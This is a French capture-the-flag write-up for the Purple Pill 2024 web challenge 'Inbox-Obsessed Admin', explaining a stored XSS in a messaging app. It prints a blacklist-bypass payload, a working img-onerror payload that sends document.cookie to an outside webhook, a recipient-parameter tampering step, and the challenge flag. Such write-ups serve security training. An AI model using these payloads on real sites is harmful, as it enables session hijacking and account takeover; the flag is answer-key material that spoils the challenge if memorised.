---
title: Inbox-Obsessed Admin
categories: [Purple_Pill_2024, Web]
tags: [web, XSS, sécurité]
image: '/assets/images/Purple_Pill_2024/logo.png'
---

# 𝄞 Introduction

![Intro](/assets/images/Purple_Pill_2024/Web/Inbox_Obsessed_Admin/intro.webp)

L’objectif de ce challenge est de compromettre le compte administrateur en exploitant une faille XSS pour lui voler son cookie de session, permettant ainsi d’obtenir le flag.

## 𝄞 Solution

![Accueil](/assets/images/Purple_Pill_2024/Web/Inbox_Obsessed_Admin/ladding_page.webp)

La page d’accueil affiche une interface assez simple, proposant deux fonctionnalités principales :
- Boîte de réception
- Envoi de messages

### 𝄞𝄞 Boîte de réception

Nous avons la possibilité d’envoyer des messages aux utilisateurs nommés **"user"** et **"admin"**.

![Send_user](/assets/images/Purple_Pill_2024/Web/Inbox_Obsessed_Admin/send_user.webp)  
![Send_admin](/assets/images/Purple_Pill_2024/Web/Inbox_Obsessed_Admin/send_admin.webp)

L’idée ici est de tenter une injection XSS dans le message pour voler le cookie de session de l’utilisateur qui ouvrira l’e-mail.

### 𝄞𝄞 Envoyer un message

Pour tester cette hypothèse, nous essayons d’abord avec un payload simple :

```html
<script>alert("fxoverflow")</script>
``` 

Malheureusement, le mot-clé `<script>` est bloqué par une blacklist.

![blacklist](/assets/images/Purple_Pill_2024/Web/Inbox_Obsessed_Admin/blacklist.webp)


Nous devons donc trouver une alternative sans utiliser cette balise.

Nous essayons le payload suivant :

```html
<image/src/onerror=prompt(8)>
```  

Celui-ci fonctionne, ce qui confirme que l’application est bien vulnérable à une attaque XSS, nous permettant ainsi de capturer le cookie de l’utilisateur qui consulte l’e-mail. Pour valider le fonctionnement, nous envoyons un message contenant cette XSS à notre propre utilisateur afin de vérifier que le cookie est récupéré lors de la consultation du message.

**Payload final**  

Nous utilisons ce payload pour exfiltrer le cookie :

```html
<img src="q" onerror="fetch('https://webhook-test.com/7136433249cbc8fd15442c54de08e7d6', {
  method: 'POST',
  mode: 'no-cors',
  body: document.cookie
})">
```

En interceptant la requête d’envoi de message avec **Burp Suite**, nous observons deux paramètres dans la requête POST :


![Burp](/assets/images/Purple_Pill_2024/Web/Inbox_Obsessed_Admin/burp1.webp)

**recipient**  
**message**

Après l’envoi, aucun résultat... Ce n’est qu’après quelques minutes de réflexion que nous réalisons que le message était envoyé à l’utilisateur "**user**", alors que nous sommes l’utilisateur "**2**".  

Nous modifions donc la valeur du paramètre **recipient** en **2** pour correspondre à notre propre compte.

![Burp2](/assets/images/Purple_Pill_2024/Web/Inbox_Obsessed_Admin/burp2.webp)

Dès lors, en consultant notre boîte de réception, nous constatons que le message piégé est bien présent et que l’attaque XSS est activée sans alerte pour l’utilisateur.

![xss](/assets/images/Purple_Pill_2024/Web/Inbox_Obsessed_Admin/proof_xss.webp)

En ouvrant l’e-mail, nous capturons le cookie de session de notre utilisateur sur le site :

![webhook](/assets/images/Purple_Pill_2024/Web/Inbox_Obsessed_Admin/webhook.webp)

Pour finaliser l’attaque, il suffit de répéter ce processus pour l’utilisateur admin, en profitant du bot chargé de lire les e-mails du compte administrateur. Cela nous permet de récupérer le cookie administrateur et de nous connecter en tant qu’administrateur.


𝄞 FLAG : `PPC2024{4K7Uzpxw8V82Nn}` 𝄞
